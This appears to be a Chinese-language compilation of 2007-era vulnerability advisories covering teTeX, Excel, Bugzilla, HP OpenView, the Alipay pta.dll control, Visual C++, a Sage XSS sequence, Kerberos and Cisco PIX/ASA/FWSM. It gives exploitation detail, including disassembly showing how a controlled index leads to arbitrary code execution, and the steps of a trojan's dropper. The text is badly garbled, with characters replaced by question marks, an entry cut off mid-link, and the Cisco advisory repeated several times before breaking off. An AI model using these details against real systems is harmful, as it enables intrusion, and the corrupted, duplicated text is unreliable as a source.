---------- 1.TXT   teTeX是Linux上最常用的编辑器之一，几乎所有的Linux发行版都内置的这个软件?teTeX在处理超长的路径名参数时存在缓冲区溢出漏洞，本地攻击者可能利用此漏洞提升自己的权限?teTeX的mkind.c文件中的open_sty函数没有正确验证用户通过\"-s\"选项提供的参数数据：150                         /* style file */151                     case &#039;s&#039;:152                         argc--;153                         if (argc <= 0)154                             FATAL(\"Expected -s <stylefile>\n\",\"\");155                         open_sty(*++argv);156                         sty_given = TRUE;157                         break;sty_fn仅为72个字符，请见mkindex.h?56 char    sty_fn[LINE_MAX]; (gdb) print LINE_MAX$2 = 72 (gdb)这允许恶意攻击者覆盖sty_fn[]缓冲区后的任意数据，导致执行任意指令? 此外mkind.c文件中的check_idx函数中还存在堆溢出漏洞，但由于无法控制覆盖地址，因此基本不可利用?       Microsoft Excel是非常流行的电子表格处理办公软件?Microsoft Excel处理畸形文件格式时存在漏洞，远程攻击者可能利用此漏洞通过诱骗用户打开恶意文件控制用户机器?如果用户受骗打开了恶意的Excel文件的话，就可能导致执行任意代码。目前这个漏洞正在被名为Exploit-MSExcel.h的木马积极地利用。在打开畸形的XLS文件时会执行以下操作?* 在内存中解压异或加密的shellcode* 对于Windows XP Service Pack 2，使用硬编码的地址加载KERNEL32.DLL；对于其他Windows版本，Excel会崩?* 使用API调用GetTempPathA和CreateFileA?Temp%\top10.exe中创建新文件* 使用API调用GetFileSize在内存中查找打开的XLS文件句柄，匹配特定的文件大小* 从XLS文件中解压有效负载并写入%Temp%\top10.exe* 执行%Temp%\top10.exe<*链接：http://secunia.com/advisories/24008/        http://www.avertlabs.com/research/blog/?p=191        http://www.microsoft.com/technet/security/advisory/932553.mspx?pf=true        http://vil.nai.com/vil/content/v_141393.htm        http://www.microsoft.com/technet/security/Bulletin/ms07-015.mspx?pf=true        http://www.us-cert.gov/cas/techalerts/TA07-044A.html*>        Bugzilla是很多软件项目都在使用的基于Web的bug跟踪系统? Mozilla Bugzilla所捆绑的mod_perl初始化脚本在包含有Bugzilla目录的Apache配置中定义了新的<Directory>块。该块导?htaccess无法运行，这样攻击者可以通过浏览器读取包含有连接到数据库服务器所使用用户名和口令的localconfig文件?       HP OpenView网络节点管理?OV NNM)是HP公司开发和维护的网络管理系统软件，具有强大的网络节点管理功能。HP OpenView网络节点管理器在软件安装时设置默认访问权限时存在漏洞，本地攻击者可能利用此漏洞提升权限。在安装HP Open View NNM控制台期间使用了以下命令：C:\WINDOWS\system32\cmd.exe /C CALL cacls \"C:\Program Files\HP OpenView\" /T /C /P \Everyone:F < \"C:\Program Files\HP OpenView\yes.txt\" >> \"C:\Program Files\HP \OpenView\log\setup.log\"这个命令递归的将C:\Program Files\HP OpenView文件夹的访问权限更改为Everyone:Full Control，这样本地用户就可以使用木马或后门替换任意HP Open View可执行文件或ActiveX组件，获取运行Open View应用程序用户的权限，通常为网络管理员。更为严重的是在HP Open View文件夹中安装了一个名为HP Open View Shared Trace Service的服务，可执行程序为C:\Program Files\HP OpenView\bin\ovtrcsvc.exe。该程序的最高权限可能为Local System，因此本地用户可能覆盖该服务可执行程序，获得Local System权限?      阿里巴巴支付?Alipay)是阿里巴巴站点所提供的电子商务在线支付服务。阿里巴巴支付宝的口令输入控件实现上存在漏洞，远程攻击者可能利用此漏洞控制用户机器。支付宝的口令输入控件pta.dll中存在远程代码执行漏洞。pta.dll以如下方式引用Remove()函数?   InprocServer32:    pta.dll    ClassID      :     66F50F46-70A0-4A05-BD5E-FBCC0F9641EC    [id(0x60030001), helpstring(\"method Remove\")]    void Remove([in] int idx);Remove()函数以如下方式处理idx参数?   .text:10003D4E ; Remove    .text:10003D4E    .text:10003D4E sub_10003D4E    proc near            ; DATA XREF: .rdata:1000B3A4 o    .text:10003D4E                            ; .rdata:1000B41C o ...    .text:10003D4E    .text:10003D4E arg_0           = dword ptr  4    .text:10003D4E arg_4           = dword ptr  8    .text:10003D4E    .text:10003D4E                 mov     eax, [esp+arg_4]            .text:10003D52                 test    eax, eax    .text:10003D54                 jl      short loc_10003D78        .text:10003D56                 push    esi    .text:10003D57                 mov     esi, [esp+4+arg_0]    ; get idx    .text:10003D5B                 shl     eax, 4            ; idx << 4    .text:10003D5E                 add     eax, [esi+8]        ; [esi+8]=0    .text:10003D61                 push    edi            ;    .text:10003D62                 mov     edi, eax            ; idx << 4 ==>edi    .text:10003D64                 mov     eax, [edi+8]        ; [(idx << 4)+8]==>eax    .text:10003D67                 push    eax    .text:10003D68                 mov     ecx, [eax]        ; [[(idx << 4)+8]]==>ecx    .text:10003D6A                 call    dword ptr [ecx+8]    ; [[[(idx <<4)+8]]+8]==>jmp addr    .text:10003D6D                 push    edi    .text:10003D6E                 lea     ecx, [esi+4]    .text:10003D71                 call    sub_10003F35    .text:10003D76                 pop     edi    .text:10003D77                 pop     esi    .text:10003D78    .text:10003D78 loc_10003D78:                    ; CODE XREF: sub_10003D4E+6 j    .text:10003D78                 xor     eax, eax    .text:10003D7A                 retn    8    .text:10003D7A sub_10003D4E    endpidx是用户可控的DWORD值，因此攻击者可以获得完全控制。例如，如果将idx设置?x41414141的话，就会在地址[[[14141410h+8]]+8]执行任意指令?       Microsoft Visual C++是基于Windows平台的C++编译器。Microsoft Visual C++标准库时间函数实现上存在漏洞，攻击者可能利用此漏洞导致相关的应用程序崩溃。在64位版本的时间函数中，如：localtime()localtime_s()gmtime()gmtime_s()ctime()ctime_s()wctime()wctime_s()fstat()如果time_t参数大于等于_MAX__TIME64_T(代表3000???0:00:00)的话，就可能出现异常行为。根据MSDN文档，时间函数必须通过返回空指针或EINVAL指示错误，具体取决于函数类，但不应该调用任何无效的参数处理程序。实际上时间函数调用了无效的类似于assert()的宏，导致所调用的应用程序拒绝服务。localtime_s函数(loctim64.c)中的示例?       /*         * Check for illegal __time64_t value         */        _VALIDATE_RETURN_ERRCODE_NOEXC( (*ptime >= 0), EINVAL);        _VALIDATE_RETURN_ERRCODE( (*ptime <= _MAX__TIME64_T), EINVAL);最后的字符串初始化了断言，对于负数和超大的值都必须使用无效的VALIDATE_RETURN_ERRCODE_NOEXC。有效代码为?       /*         * Check for illegal __time64_t value         */        _VALIDATE_RETURN_ERRCODE_NOEXC( (*ptime >= 0), EINVAL);        _VALIDATE_RETURN_ERRCODE_NOEXC( (*ptime <= _MAX__TIME64_T), EINVAL);如果使用了任何上述函数的话，使用Microsoft Visual C++ 8.0编译器动态或静态函数库所编译的应用程序都受这个漏洞影响?      (1)Sage 1.3.10版本之前的版本以?2)Firefox的Sage++扩展名中存在跨站脚本攻击漏洞。远程攻击者可以借助RSS输入端中的一个\"<SCRIPT/=&#039;SRC=&#039;\"序列，注入任意web脚本或HTML。该漏洞不同于CVE-2006-4712?      Kerberos是一款广泛使用的使用强壮的加密来验证客户端和服务器端的网络协议。MIT Kerberos 5是一种常用的开源Kerberos实现?Kerberos 5 KAdminD服务程序在处理畸形格式的日志串时存在缓冲区溢出漏洞，远程攻击者可能利用此漏洞控制服务器?Kerberos 5的krb5_klog_syslog()使用vsprintf()将文本格式化到固定长度的栈缓冲区。在该函数调用中所使用的\"厂商补丁?Debian------Debian已经为此发布了一个安全公?DSA-1276-1)以及相应补丁:DSA-1276-1：New krb5 packages fix several vulnerabilities链接?a href=\"http://www.debian.org/security/2007/dsa-1276\" target=\"_blank\">http://www.debian.org/security/2007/dsa-1276</a>补丁下载?Source archives:<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5_1.3.6-2sarge4.dsc\" target=\"_blank\">http://security.debian.org/pool/updates/main/k/krb5/krb5_1.3.6-2sarge4.dsc</a>Size/MD5 checksum:      782 a4a9a2cff9292af1de210f83edcee281<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5_1.3.6-2sarge4.diff.gz\" target=\"_blank\">http://security.debian.org/pool/updates/main/k/krb5/krb5_1.3.6-2sarge4.diff.gz</a>Size/MD5 checksum:   666048 006edbace85ee6fab561c8f5ba59914d<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5_1.3.6.orig.tar.gz\" target=\"_blank\">http://security.debian.org/pool/updates/main/k/krb5/krb5_1.3.6.orig.tar.gz</a>Size/MD5 checksum:  6526510 7974d0fc413802712998d5fc5eec2919Architecture independent components:<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-doc_1.3.6-2sarge4_all.deb\" target=\"_blank\">http://security.debian.org/pool/updates/main/k/krb5/krb5-doc_1.3.6-2sarge4_all.deb</a>Size/MD5 checksum:   718724 9bd56e8f5a673661416a042cc315509bAlpha architecture:<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-admin-server_1.3.6-2sarge4_alpha.deb\" target=\"_blank\">http://security.debian.org/pool/updates/main/k/krb5/krb5-admin-server_1.3.6-2sarge4_alpha.deb</a>Size/MD5 checksum:   114882 0b1d6a3f226b48f3065f8e065049a02a<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-clients_1.3.6-2sarge4_alpha.deb\" target=\"_blank\">http://security.debian.org/pool/updates/main/k/krb5/krb5-clients_1.3.6-2sarge4_alpha.deb</a>Size/MD5 checksum:   247602 b36d6e32ae319ed6953327d0de0e091c<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-ftpd_1.3.6-2sarge4_alpha.deb\" target=\"_blank\">http://security.debian.org/pool/updates/main/k/krb5/krb5-ftpd_1.3.6-2sarge4_alpha.deb</a>Size/MD5 checksum:    62892 a96ce75c69cc4423f0922a49ce97b7ef<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-kdc_1.3.6-2sarge4_alpha.deb\" target=\"_blank\">http://security.debian.org/pool/updates/main/k/krb5/krb5-kdc_1.3.6-2sarge4_alpha.deb</a>Size/MD5 checksum:   137006 6285c054dbb18b511153aeab6d5bb399<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-rsh-server_1.3.6-2sarge4_alpha.deb\" target=\"_blank\">http://security.debian.org/pool/updates/main/k/krb5/krb5-rsh-server_1.3.6-2sarge4_alpha.deb</a>Size/MD5 checksum:    89654 491c88a0bea723021f0f1eda84450208<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-telnetd_1.3.6-2sarge4_alpha.deb\" target=\"_blank\">http://security.debian.org/pool/updates/main/k/krb5/krb5-telnetd_1.3.6-2sarge4_alpha.deb</a>Size/MD5 checksum:    72142 3cad8d2db4270a422c0ba0ccfd6a9151<a href=\"http://security.debian.org/pool/updates/main/k/krb5/krb5-user_1.3.6-2sarge4_alpha.deb\" target=\"_blank\">http://security.debian.org/pool/updates/main/k/krb5/krb5-user_1.3.6-2sarge4_alpha.deb</a>Size/MD5 checksum:   144782 dea1c0c916c80b59174b4cfd18f1eb5e<a href=\"http://security.debian.org/pool/updates/main/k/krb5/libkadm55_1.3.6-2sarge4_alpha.deb\" target=\"_blank\">http://security.debian.org/pool/updates/main/k/krb5/libkadm55_1.3.6-2sarge4_alpha.deb</a>Size/MD5 checksum:   201754 42d6fcb995989672cfde30a467f9486e<a href=\"http://security.debian.org/pool/updates/main/k/krb5/libkrb5-dev_1.3.6-2sarge4_alpha.deb\" target=\"_blank\">http://security.debian.org/pool/updates/main/k/krb5/libkrb5-dev_1.3.6-2sarge4_alpha.deb</a>Size/MD5 checksum:   860980 3dabb660978f0d3cfc2c121acf8a48de<a href=\"h   Cisco PIX和ASA都是非常流行的防火墙设备，提供能够进行状态报文过滤和深层报文检查的防火墙服务。Cisco PIX和ASA使用的认证方法实现上存在漏洞，远程攻击者可能利用此漏洞提升自己在设备上的权限。使用LOCAL方法进行用户认证可能导致权限提升。如果要利用这个漏洞，用户必须是在本地数据库中以0权限定义的且能够成功的认证到受影响的设备。仅有满足了这些条件用户才能将所分配的权限提升到15级，成为管理员之后，用户可以更改设备配置和操作的每个方面? 如果设备配置存在以下行的话设备就受这个漏洞影响：    pixfirewall(config)# aaa authentication enable console LOCAL    pixfirewall(config)# username <user_name> password <secret_pwd> privilege 0这个漏洞在Cisco Bug ID中记录为CSCsh33287       Cisco PIX/ASA和防火墙服务模块(FWSM)可提供能够进行状态报文过滤和深层报文检查的防火墙服务。Cisco PIX 500系列安全设备和Cisco ASA 5500系列自适应安全设备中存在多个安全漏洞：增强型检查畸形HTTP通讯+-----------------------------------------------   如果启用了增强型HTTP检查的话，则在检查畸形HTTP请求时Cisco PIX和ASA安全?  备可能崩溃。如果启用了HTTP应用检查的话，配置中会包含有类似于inspect http    的行，其中是特定HTTP映射的名称。请注意正常的HTTP检?通过inspect http   配置，没有HTTP映射)不受这个漏洞影响?  这个漏洞在Cisco Bug ID中记录为CSCsd75794。检查畸形SIP报文+-------------------------------------   检查畸形SIP报文可能导致Cisco PIX和ASA设备崩溃。如果要触发这个漏洞，必?  启用了SIP fixup(对于6.x软件)或inspect(对于7.x软件)功能。SIP fixup(?  6.x及更早版?和SIP检??.x及更早版?是默认启用的?    这个漏洞在Cisco Bug ID中记录为CSCsd97077和CSCse27708。检查畸形TCP报文?-------------------------------------------------   Cisco PIX和ASA设备在处理基于TCP协议中畸形报文流时可能崩溃。必须通过inspect   功能处理协议。报文可能是发送给设备的，也可能仅是通过设备的。Cisco PIX?  ASA设备可检查以下基于TCP的协议：  * 计算机电话接口快速缓冲区编码(CITQBE)  * 分布式计算环?远程过程调用(DCE/RPC)  * 域名服务(DNS)  * 扩展简单邮件传输协?ESMTP)  * 文件传输协议(FTP)  * H.323协议  * 超文本传输协?HTTP)  * Internet定位服务?ILS)  * 即时消息(IM)  * 点到点隧道协?PPTP)  * 远程Shell(RSH)  * 实时流协?RTSP)  * 会话初始协议(SIP)  * 小型(或简?客户端控制协?SCCP)  * 简单邮件传输协?SMTP)  * Oracle SQL*Net  * Sun RPC   这个漏洞在Cisco Bug ID中记录为CSCsh12711。此外，某些FWSM软件版本中存在多个漏洞，可能导致设备意外重载：增强型检查畸形HTTP通讯可能导致重载+----------------------------------------------------------------   这个漏洞可能导致FWSM在执行增强型检查HTTP请求并检查了畸形HTTP请求时出现重   载。仅在配置中存在inspect http 命令(appfw是特定HTTP映射的名?   时FWSM才会执行增强型检查HTTP通讯。这个命令默认下是禁用的?  这个漏洞在Cisco Bug ID中记录为CSCsd75794。检查畸形SIP消息可能导致重载+-------------------------------------------------------   如果通过传输控制协议(TCP)或用户数据报协议(UDP)接收到畸形SIP消息，并   且对于通过TCP的SIP使用fixup protocol sip <portnum>命令启用深度检查SIP?  息，?或对于通过UDP的SIP，在FWSM 2.3.x及之前版本中通过fixup protocol sip   udp <portnum> 命令，或在FWSM 3.x及之后版本中通过inspect sip命令启用深度   检查SIP消息，则漏洞可能导致FWSM重载。SIP fixup?.x及之前版本中和SIP检?  ?.x及之后版本中都是默认启用的?    这个漏洞在Cisco Bug ID中记录为CSCsg80915? 处理发送给FWSM的报文可能导致重?-------------------------------------------------------   这个漏洞导致FWSM在试图生?10006系统日志消息时出现重载。必须满足以下两?  条件才会出现这个漏洞? * FWSM接收到了一个设备IP地址的报文且消息不是以下协议：TCP、UDP、ICMP、OSPF?   Failover、PIM、IGMP和ESP。漏洞与报文的来源无关?     * 必须在足够高的级别启用日志以生成710006系统日志消息，默认下是调试级?7    ?。请注意日志是默认禁用的，Cisco建议仅出于调试和纠错目的在调试级别记    录日志?  这个漏洞在Cisco Bug ID中记录为CSCse85707。处理畸形HTTPS请求可能导致重载+-------------------------------------------------------   如果用户试图访问Web站点且网络管理员配置设备允许网络访问之前认证用户的话?  这个漏洞可能导致FWSM重载。这个功能被称为\"认证网络访问\"或认证代理，可通过   aaa authentication match或aaa authentication include命令启用?  重载实际上是由无效的正常Web浏览器无法生成的特殊HTTPS请求触发的?  这个漏洞在Cisco Bug ID中记录为CSCsg50228。处理超长HTTP请求可能导致重载+-------------------------------------------------------   如果管理员通过aaa authentication match或aaa authentication include命令?  用了\"认证网络访问(auth-proxy)\"的话，这个漏洞也可能导致FWSM重载。但是，   在这种情况下导致重载的HTTP请求是有效的，尽管从所请求URL非常长这个意义来   讲不是正常的请求。Web浏览器在正常的浏览期间可以生成这样的请求?  这个漏洞在Cisco Bug ID中记录为CSCsd91268。处理HTTPS通讯可能导致重载+-------------------------------------------------------   如果FWSM收到了发送给FWSM本身的特定类型HTTPS通讯的话，这个漏洞可能导致FWSM   重载。仅在通过http server enable命令在FWSM上启用了HTTPS服务器的情况下才   会出现这个漏洞，该命令是默认禁用的?    这个漏洞在Cisco Bug ID中记录为CSCsf29974。处理畸形SNMP请求可能导致重载+-------------------------------------------------------   如果从可信任的设备接收了畸形SNMP消息的话，这个漏洞可能导致FWSM重载。必?  通过snmp-server host <interface name> <IP of trusted device>命令对可信任   设备允许明确的SNMP poll访问?  这个漏洞在Cisco Bug ID中记录为CSCse52679?      Cisco PIX/ASA和防火墙服务模块(FWSM)可提供能够进行状态报文过滤和深层报文检查的防火墙服务?Cisco PIX 500系列安全设备和Cisco ASA 5500系列自适应安全设备中存在多个安全漏洞：增强型检查畸形HTTP通讯+-----------------------------------------------   如果启用了增强型HTTP检查的话，则在检查畸形HTTP请求时Cisco PIX和ASA安全?   备可能崩溃。如果启用了HTTP应用检查的话，配置中会包含有类似于inspect http    的行，其中是特定HTTP映射的名称。请注意正常的HTTP检?通过inspect http   配置，没有HTTP映射)不受这个漏洞影响?   这个漏洞在Cisco Bug ID中记录为CSCsd75794?检查畸形SIP报文+-------------------------------------   检查畸形SIP报文可能导致Cisco PIX和ASA设备崩溃。如果要触发这个漏洞，必?   启用了SIP fixup(对于6.x软件)或inspect(对于7.x软件)功能。SIP fixup(?   6.x及更早版?和SIP检??.x及更早版?是默认启用的?     这个漏洞在Cisco Bug ID中记录为CSCsd97077和CSCse27708?检查畸形TCP报文?+-------------------------------------------------   Cisco PIX和ASA设备在处理基于TCP协议中畸形报文流时可能崩溃。必须通过inspect   功能处理协议。报文可能是发送给设备的，也可能仅是通过设备的。Cisco PIX?   ASA设备可检查以下基于TCP的协议：  * 计算机电话接口快速缓冲区编码(CITQBE)  * 分布式计算环?远程过程调用(DCE/RPC)  * 域名服务(DNS)  * 扩展简单邮件传输协?ESMTP)  * 文件传输协议(FTP)  * H.323协议  * 超文本传输协?HTTP)  * Internet定位服务?ILS)  * 即时消息(IM)  * 点到点隧道协?PPTP)  * 远程Shell(RSH)  * 实时流协?RTSP)  * 会话初始协议(SIP)  * 小型(或简?客户端控制协?SCCP)  * 简单邮件传输协?SMTP)  * Oracle SQL*Net  * Sun RPC   这个漏洞在Cisco Bug ID中记录为CSCsh12711?此外，某些FWSM软件版本中存在多个漏洞，可能导致设备意外重载?增强型检查畸形HTTP通讯可能导致重载+----------------------------------------------------------------   这个漏洞可能导致FWSM在执行增强型检查HTTP请求并检查了畸形HTTP请求时出现重   载。仅在配置中存在inspect http 命令(appfw是特定HTTP映射的名?   时FWSM才会执行增强型检查HTTP通讯。这个命令默认下是禁用的?   这个漏洞在Cisco Bug ID中记录为CSCsd75794?检查畸形SIP消息可能导致重载+-------------------------------------------------------   如果通过传输控制协议(TCP)或用户数据报协议(UDP)接收到畸形SIP消息，并   且对于通过TCP的SIP使用fixup protocol sip <portnum>命令启用深度检查SIP?   息，?或对于通过UDP的SIP，在FWSM 2.3.x及之前版本中通过fixup protocol sip   udp <portnum> 命令，或在FWSM 3.x及之后版本中通过inspect sip命令启用深度   检查SIP消息，则漏洞可能导致FWSM重载。SIP fixup?.x及之前版本中和SIP检?   ?.x及之后版本中都是默认启用的?     这个漏洞在Cisco Bug ID中记录为CSCsg80915?  处理发送给FWSM的报文可能导致重?+-------------------------------------------------------   这个漏洞导致FWSM在试图生?10006系统日志消息时出现重载。必须满足以下两?   条件才会出现这个漏洞?  * FWSM接收到了一个设备IP地址的报文且消息不是以下协议：TCP、UDP、ICMP、OSPF?    Failover、PIM、IGMP和ESP。漏洞与报文的来源无关?      * 必须在足够高的级别启用日志以生成710006系统日志消息，默认下是调试级?7    ?。请注意日志是默认禁用的，Cisco建议仅出于调试和纠错目的在调试级别记    录日志?   这个漏洞在Cisco Bug ID中记录为CSCse85707?处理畸形HTTPS请求可能导致重载+-------------------------------------------------------   如果用户试图访问Web站点且网络管理员配置设备允许网络访问之前认证用户的话?   这个漏洞可能导致FWSM重载。这个功能被称为\"认证网络访问\"或认证代理，可通过   aaa authentication match或aaa authentication include命令启用?   重载实际上是由无效的正常Web浏览器无法生成的特殊HTTPS请求触发的?   这个漏洞在Cisco Bug ID中记录为CSCsg50228?处理超长HTTP请求可能导致重载+-------------------------------------------------------   如果管理员通过aaa authentication match或aaa authentication include命令?   用了\"认证网络访问(auth-proxy)\"的话，这个漏洞也可能导致FWSM重载。但是，   在这种情况下导致重载的HTTP请求是有效的，尽管从所请求URL非常长这个意义来   讲不是正常的请求。Web浏览器在正常的浏览期间可以生成这样的请求?   这个漏洞在Cisco Bug ID中记录为CSCsd91268?处理HTTPS通讯可能导致重载+-------------------------------------------------------   如果FWSM收到了发送给FWSM本身的特定类型HTTPS通讯的话，这个漏洞可能导致FWSM   重载。仅在通过http server enable命令在FWSM上启用了HTTPS服务器的情况下才   会出现这个漏洞，该命令是默认禁用的?     这个漏洞在Cisco Bug ID中记录为CSCsf29974?处理畸形SNMP请求可能导致重载+-------------------------------------------------------   如果从可信任的设备接收了畸形SNMP消息的话，这个漏洞可能导致FWSM重载。必?   通过snmp-server host <interface name> <IP of trusted device>命令对可信任   设备允许明确的SNMP poll访问?   这个漏洞在Cisco Bug ID中记录为CSCse52679?       Cisco PIX/ASA和防火墙服务模块(FWSM)可提供能够进行状态报文过滤和深层报文检查的防火墙服务。Cisco PIX 500系列安全设备和Cisco ASA 5500系列自适应安全设备中存在多个安全漏洞：增强型检查畸形HTTP通讯+-----------------------------------------------   如果启用了增强型HTTP检查的话，则在检查畸形HTTP请求时Cisco PIX和ASA安全?  备可能崩溃。如果启用了HTTP应用检查的话，配置中会包含有类似于inspect http    的行，其中是特定HTTP映射的名称。请注意正常的HTTP检?通过inspect http   配置，没有HTTP映射)不受这个漏洞影响?  这个漏洞在Cisco Bug ID中记录为CSCsd75794。检查畸形SIP报文+-------------------------------------   检查畸形SIP报文可能导致Cisco PIX和ASA设备崩溃。如果要触发这个漏洞，必?  启用了SIP fixup(对于6.x软件)或inspect(对于7.x软件)功能。SIP fixup(?  6.x及更早版?和SIP检??.x及更早版?是默认启用的?    这个漏洞在Cisco Bug ID中记录为CSCsd97077和CSCse27708。检查畸形TCP报文?-------------------------------------------------   Cisco PIX和ASA设备在处理基于TCP协议中畸形报文流时可能崩溃。必须通过inspect   功能处理协议。报文可能是发送给设备的，也可能仅是通过设备的。Cisco PIX?  ASA设备可检查以下基于TCP的协议：  * 计算机电话接口快速缓冲区编码(CITQBE)  * 分布式计算环?远程过程调用(DCE/RPC)  * 域名服务(DNS)  * 扩展简单邮件传输协?ESMTP)  * 文件传输协议(FTP)  * H.323协议  * 超文本传输协?HTTP)  * Internet定位服务?ILS)  * 即时消息(IM)  * 点到点隧道协?PPTP)  * 远程Shell(RSH)  * 实时流协?RTSP)  * 会话初始协议(SIP)  * 小型(或简?客户端控制协?SCCP)  * 简单邮件传输协?SMTP)  * Oracle SQL*Net  * Sun RPC   这个漏洞在Cisco Bug ID中记录为CSCsh12711。此外，某些FWSM软件版本中存在多个漏洞，可能导致设备意外重载：增强型检查畸形HTTP通讯可能导致重载+----------------------------------------------------------------   这个漏洞可能导致FWSM在执行增强型检查HTTP请求并检查了畸形HTTP请求时出现重   载。仅在配置中存在inspect http 命令(appfw是特定HTTP映射的名?   时FWSM才会执行增强型检查HTTP通讯。这个命令默认下是禁用的?  这个漏洞在Cisco Bug ID中记录为CSCsd75794。检查畸形SIP消息可能导致重载+-------------------------------------------------------   如果通过传输控制协议(TCP)或用户数据报协议(UDP)接收到畸形SIP消息，并   且对于通过TCP的SIP使用fixup protocol sip <portnum>命令启用深度检查SIP?  息，?或对于通过UDP的SIP，在FWSM 2.3.x及之前版本中通过fixup protocol sip   udp <portnum> 命令，或在FWSM 3.x及之后版本中通过inspect sip命令启用深度   检查SIP消息，则漏洞可能导致FWSM重载。SIP fixup?.x及之前版本中和SIP检?  ?.x及之后版本中都是默认启用的?    这个漏洞在Cisco Bug ID中记录为CSCsg80915? 处理发送给FWSM的报文可能导致重?-------------------------------------------------------   这个漏洞导致FWSM在试图生?10006系统日志消息时出现重载。必须满足以下两?  条件才会出现这个漏洞? * FWSM接收到了一个设备IP地址的报文且消息不是以下协议：TCP、UDP、ICMP、OSPF?   Failover、PIM、IGMP和ESP。漏洞与报文的来源无关?     * 必须在足够高的级别启用日志以生成710006系统日志消息，默认下是调试级?7    ?。请注意日志是默认禁用的，Cisco建议仅出于调试和纠错目的在调试级别记    录日志?  这个漏洞在Cisco Bug ID中记录为CSCse85707。处理畸形HTTPS请求可能导致重载+-------------------------------------------------------   如果用户试图访问Web站点且网络管理员配置设备允许网络访问之前认证用户的话?  这个漏洞可能导致FWSM重载。这个功能被称为\"认证网络访问\"或认证代理，可通过   aaa authentication match或aaa authentication include命令启用?  重载实际上是由无效的正常Web浏览器无法生成的特殊HTTPS请求触发的?  这个漏洞在Cisco Bug ID中记录为CSCsg50228。处理超长HTTP请求可能导致重载+-------------------------------------------------------   如果管理员通过aaa authentication match或aaa authentication include命令?  用了\"认证网络访问(auth-proxy)\"的话，这个漏洞也可能导致FWSM重载。但是，   在这种情况下导致重载的HTTP请求是有效的，尽管从所请求URL非常长这个意义来   讲不是正常的请求。Web浏览器在正常的浏览期间可以生成这样的请求?  这个漏洞在Cisco Bug ID中记录为CSCsd91268。处理HTTPS通讯可能导致重载+-------------------------------------------------------   如果FWSM收到了发送给FWSM本身的特定类型HTTPS通讯的话，这个漏洞可能导致FWSM   重载。仅在通过http server enable命令在FWSM上启用了HTTPS服务器的情况下才   会出现这个漏洞，该命令是默认禁用的?    这个漏洞在Cisco Bug ID中记录为CSCsf29974。处理畸形SNMP请求可能导致重载+-------------------------------------------------------   如果从可信任的设备接收了畸形SNMP消息的话，这个漏洞可能导致FWSM重载。必?  通过snmp-server host <interface name> <IP of trusted device>命令对可信任   设备允许明确的SNMP poll访问?  这个漏洞在Cisco Bug ID中记录为CSCse52679?      Cisco PIX/ASA和防火墙服务模块(FWSM)可提供能够进行状态报文过滤和深层报文检查的防火墙服务?Cisco PIX 500系列安全设备和Cisco ASA 5500系列自适应安全设备中存在处理畸形SNMP请求可能导致重载安全漏洞?处理畸形SNMP请求可能导致重载+-------------------------------------------------------   如果从可信任的设备接收了畸形SNMP消息的话，这个漏洞可能导致FWSM重载。必?   通过snmp-server host <interface name> <IP of trusted device>命令对可信任   设备允许明确的SNMP poll访问?   这个漏洞在Cisco Bug ID中记录为CSCse52679?       Cisco PIX/ASA和防火墙服务模块(FWSM)可提供能够进行状态报文过滤和深层报文检查的防火墙服务。Cisco PIX 500系列安全设备和Cisco ASA 5500系列自适应安全设备中存在多个安全漏洞：增强型检查畸形HTTP通讯+-----------------------------------------------   如果启用了增强型HTTP检查的话，则在检查畸形HTTP请求时Cisco PIX和ASA安全?  备可能崩溃。如果启用了HTTP应用检查的话，配置中会包含有类似于inspect http    的行，其中是特定HTTP映射的名称。请注意正常的HTTP检?通过inspect http   配置，没有HTTP映射)不受这个漏洞影响?  这个漏洞在Cisco Bug ID中记录为CSCsd75794。检查畸形SIP报文+-------------------------------------   检查畸形SIP报文可能导致Cisco PIX和ASA设备崩溃。如果要触发这个漏洞，必?  启用了SIP fixup(对于6.x软件)或inspect(对于7.x软件)功能。SIP fixup(?  6.x及更早版?和SIP检??.x及更早版?是默认启用的?    这个漏洞在Cisco Bug ID中记录为CSCsd97077和CSCse27708。检查畸形TCP报文?-------------------------------------------------   Cisco PIX和ASA设备在处理基于TCP协议中畸形报文流时可能崩溃。必须通过inspect   功能处理协议。报文可能是发送给设备的，也可能仅是通过设备的。Cisco PIX?  ASA设备可检查以下基于TCP的协议：  * 计算机电话接口快速缓冲区编码(CITQBE)  * 分布式计算环?远程过程调用(DCE/RPC)  * 域名服务(DNS)  * 扩展简单邮件传输协?ESMTP)  * 文件传输协议(FTP)  * H.323协议  * 超文本传输协?HTTP)  * Internet定位服务?ILS)  * 即时消息(IM)  * 点到点隧道协?PPTP)  * 远程Shell(RSH)  * 实时流协?RTSP)  * 会话初始协议(SIP)  * 小型(或简?客户端控制协?SCCP)  * 简单邮件传输协?SMTP)  * Oracle SQL*Net  * Sun RPC   这个漏洞在Cisco Bug ID中记录为CSCsh12711。此外，某些FWSM软件版本中存在多个漏洞，可能导致设备意外重载：增强型检查畸形HTTP通讯可能导致重载+----------------------------------------------------------------   这个漏洞可能导致FWSM在执行增强型检查HTTP请求并检查了畸形HTTP请求时出现重   载。仅在配置中存在inspect http 命令(appfw是特定HTTP映射的名?   时FWSM才会执行增强型检查HTTP通讯。这个命令默认下是禁用的?  这个漏洞在Cisco Bug ID中记录为CSCsd75794。检查畸形SIP消息可能导致重载+-------------------------------------------------------   如果通过传输控制协议(TCP)或用户数据报协议(UDP)接收到畸形SIP消息，并   且对于通过TCP的SIP使用fixup protocol sip <portnum>命令启用深度检查SIP?  息，?或对于通过UDP的SIP，在FWSM 2.3.x及之前版本中通过fixup protocol sip   udp <portnum> 命令，或在FWSM 3.x及之后版本中通过inspect sip命令启用深度   检查SIP消息，则漏洞可能导致FWSM重载。SIP fixup?.x及之前版本中和SIP检?  ?.x及之后版本中都是默认启用的?    这个漏洞在Cisco Bug ID中记录为CSCsg80915? 处理发送给FWSM的报文可能导致重?-------------------------------------------------------   这个漏洞导致FWSM在试图生?10006系统日志消息时出现重载。必须满足以下两?  条件才会出现这个漏洞? * FWSM接收到了一个设备IP地址的报文且消息不是以下协议：TCP、UDP、ICMP、OSPF?   Failover、PIM、IGMP和ESP。漏洞与报文的来源无关?     * 